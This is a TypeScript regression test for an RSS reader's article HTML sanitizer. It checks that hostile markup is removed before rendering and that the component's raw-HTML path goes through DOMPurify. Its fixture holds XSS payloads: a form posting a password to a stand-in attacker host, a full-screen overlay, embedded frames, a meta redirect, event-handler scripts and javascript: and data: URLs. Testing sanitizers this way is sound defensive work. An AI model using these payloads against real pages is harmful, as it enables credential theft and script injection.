import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { JSDOM } from "jsdom";
import { createServer } from "vite";
import { detectArticleContentFormat } from "../src/utils/articleContent.ts";

const { window } = new JSDOM("");
globalThis.window = window as unknown as Window & typeof globalThis;

const testDir = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(testDir, "..");
const vite = await createServer({ root, appType: "custom", server: { middlewareMode: true } });
const readerModule = await vite.ssrLoadModule("/src/components/ReaderModal.tsx") as Record<string, unknown>;
const sanitizeArticleHtml = readerModule.sanitizeArticleHtml;
const isArticleHtml = readerModule.isArticleHtml;

assert.equal(typeof sanitizeArticleHtml, "function", "ReaderModal must export its article HTML sanitizer for regression coverage");
if (typeof sanitizeArticleHtml !== "function") {
  throw new TypeError("sanitizeArticleHtml is not available");
}
assert.equal(typeof isArticleHtml, "function", "ReaderModal must distinguish RSS HTML from Markdown before rendering");
if (typeof isArticleHtml !== "function") {
  throw new TypeError("isArticleHtml is not available");
}

assert.equal(isArticleHtml("<p>正文 <strong>重点</strong></p>"), true);
assert.equal(isArticleHtml("<script>alert(1)</script><p>正文</p>"), true);
assert.equal(isArticleHtml("# 标题\n\n**正文**"), false);
assert.equal(isArticleHtml("# HTML 示例\n\n```html\n<p>示例</p>\n```"), false);
assert.equal(isArticleHtml("阅读 <https://example.com/source>"), false);
assert.equal(isArticleHtml("2 < 3，普通文本"), false);
assert.equal(detectArticleContentFormat("<p>RSS 正文</p>"), "html");
assert.equal(detectArticleContentFormat("# HTML 示例\n\n```html\n<p>示例</p>\n```"), "text");

const maliciousArticle = `
  <style>.reader-takeover { position: fixed; inset: 0; z-index: 999999; }</style>
  <form action="https://evil.example/collect">
    <input name="password" value="stolen">
    <button type="submit">Send</button>
  </form>
  <div class="reader-takeover" style="position:fixed;inset:0" onclick="alert(1)">Overlay copy</div>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="https://evil.example/object"></object>
  <embed src="https://evil.example/embed">
  <meta http-equiv="refresh" content="0;url=https://evil.example">
  <p>Useful <strong>article</strong> copy.</p>
  <img src="https://cdn.example.com/photo.jpg" alt="Article photo" onerror="alert(1)">
  <img src="../relative-photo.jpg" alt="Relative article photo">
  <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="Dangerous data image">
  <a href="https://example.com/source" target="_blank">Safe source</a>
  <a href="javascript:alert(1)">Dangerous link</a>
`;

const sanitized = sanitizeArticleHtml(maliciousArticle, "https://example.com/articles/reader") as string;
const document = new JSDOM(`<body>${sanitized}</body>`).window.document;

assert.equal(document.querySelector("style, form, input, button, iframe, object, embed, meta"), null);
assert.equal(document.querySelector("[style], [onclick], [onerror]"), null);
assert.doesNotMatch(sanitized, /position\s*:\s*fixed|reader-takeover|javascript:|data:text\/html/i);
assert.doesNotMatch(sanitized, /Send|stolen/, "Forbidden form contents must be discarded with their controls");
assert.match(sanitized, /<p>Useful <strong>article<\/strong> copy\.<\/p>/);
assert.equal(
  document.querySelector('img[alt="Article photo"]')?.getAttribute("src"),
  "/api/image-proxy?url=https%3A%2F%2Fcdn.example.com%2Fphoto.jpg&referer=https%3A%2F%2Fexample.com%2Farticles%2Freader",
);
assert.equal(document.querySelector('img[alt="Article photo"]')?.getAttribute("referrerpolicy"), "no-referrer");
assert.equal(document.querySelector('img[alt="Article photo"]')?.getAttribute("loading"), "lazy");
assert.equal(
  document.querySelector('img[alt="Relative article photo"]')?.getAttribute("src"),
  "/api/image-proxy?url=https%3A%2F%2Fexample.com%2Frelative-photo.jpg&referer=https%3A%2F%2Fexample.com%2Farticles%2Freader",
);
assert.equal(document.querySelector('img[alt="Dangerous data image"]')?.hasAttribute("src"), false);
assert.equal(document.querySelector("a")?.getAttribute("href"), "https://example.com/source");
assert.equal(document.querySelectorAll("a")[1]?.hasAttribute("href"), false);

const readerSource = readFileSync(path.join(testDir, "../src/components/ReaderModal.tsx"), "utf8");
assert.doesNotMatch(readerSource, /rehypeRaw/, "ReactMarkdown must not parse untrusted raw HTML");
assert.equal((readerSource.match(/dangerouslySetInnerHTML/g) || []).length, 1);
assert.match(
  readerSource,
  /dangerouslySetInnerHTML=\{\{\s*__html:\s*sanitizedArticleContent\s*\}\}/,
  "The article HTML insertion path must use the DOMPurify result",
);
assert.match(
  readerSource,
  /articleContentIsHtml\s*\?\s*\([\s\S]*<SafeArticleHtml[\s\S]*:\s*\([\s\S]*<ReactMarkdown/,
  "RSS HTML must use the sanitized HTML branch while Markdown stays in ReactMarkdown",
);

await vite.close();
console.log("PASS: reader strips persistent article HTML and CSS injection vectors");
